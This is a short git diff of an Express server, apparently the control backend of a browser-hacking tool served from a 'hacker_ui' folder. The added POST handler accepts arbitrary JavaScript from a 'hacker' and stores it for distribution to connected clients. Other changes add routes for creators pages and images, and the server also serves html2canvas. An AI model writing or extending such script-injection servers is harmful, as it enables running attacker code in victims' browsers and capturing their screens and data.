@@ -37,7 +37,8 @@ const activeFuncs = {
 
 // Hacker will send the javascript content to server
 app.post('/', (req, res) => {
-  res.send('Got a POST request')
+  activeFuncs.function = req.body.function;
+  res.send("Function injected");
 })
 
 // send the list of utility functions to the client
@@ -87,6 +88,10 @@ app.get('/utils.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'hacker_ui/utils.html'));
 })
 
+app.get('/creators.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'hacker_ui/creators.html'));
+})
+
 app.get('/hack.ttf', (req, res) => {
   res.sendFile(path.join(__dirname, 'hacker_ui/hack.ttf'));
 })
@@ -97,6 +102,10 @@ app.get('/hacker.css', (req, res) => {
 
 app.get('/dragon.png', (req, res) => {
   res.sendFile(path.join(__dirname, 'hacker_ui/dragon.png'));
+})
+
+app.get('/creators.jpeg', (req, res) => {
+  res.sendFile(path.join(__dirname, 'hacker_ui/creators.jpeg'));
 })
 
 app.get('/html2canvas.min.js', (req, res) => {
